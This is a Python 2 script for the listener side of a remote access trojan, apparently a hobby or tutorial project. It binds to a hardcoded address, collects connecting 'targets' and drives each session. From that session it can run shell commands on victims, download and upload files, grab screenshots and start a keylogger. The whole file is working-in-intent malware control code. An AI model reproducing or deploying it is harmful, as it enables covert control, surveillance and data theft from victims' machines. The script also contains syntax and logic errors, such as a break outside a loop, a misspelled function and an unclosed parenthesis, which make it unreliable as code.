#!/usr/bin/python

import socket
import json
import os
import base64
import threading


def shell(target, ip):
	def reliable_send(data):
        	json_data = json.dumps(data)
        	target.send(json_data)
	def reliable_recv():
        	data = ""
        	while True:
                	try:
                        	data = data + target.recv(1024)
                        	return json.loads(data)
                	except ValueError:
                        	continue


        global count
        while True:
                command = raw_input ("* Shell#-%s: " % str(ip))
                reliable_send(command)
                if command =='q':
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
                elif command[:8] =="download":
                        with open(command[9:], "wb") as file:
                                result = reliable_recv()
                                file.write(base64.b64decode(result))
                elif command[:6] == "upload":
                        try:
                                with open(command[7:], "rb") as fin:
                                        relaiable_send(base64.b64encode(fin.read()))
                        except:
                                failed= "Failed to upload"
                                reliable_send(base64.b64encode(failed))
                elif command[:10] =="screenshot":
                        with open("screenshot%d" % count, "wb") as screen:
                                image = reliable_recv()
                                image_decode = base64.b64decode(image)
                                if image_decode[:4] == "Fail":
                                        print(image_decode)
                                else:
                                        screen.write(image_decode)
					count += 1
                elif command[:12] =="keylog_start":
                        continue
                else:
                        result = reliable_recv()
                        print(result)


def server():
	if stop_threads:
		break
	global clients
	while True:
		s.settimeout(1)
		try:
			target, ip = s.accept()
			targets.append(target)
			ips.append(ip)
			print((str(targets[clients])) + "--------" + str(ips[clients]) + " Has Connected!" )
			clients += 1
		except:
			pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(("192.168.85.142", 54321))
s.listen(5)

clients=0
stop_threads = False
print("Waiting for Targets to Connect....")
t1= threading.Thread(target=server)
t1.start()


while True:
	command = raw_input("* Center: ")
	if command =="targets":
		count = 0
		for ip in ips:
			print("Session: " + str(count) + ". <----> " + str(ip))
			count +=1
	elif command[:7] == "session":
		try:
			num = (int(command[8:])
			tarnum = targets[num]
			tarip = ips[num]
			shell(tarnum,tarip)
		except:
			print("[!!] No session found Under Number ")
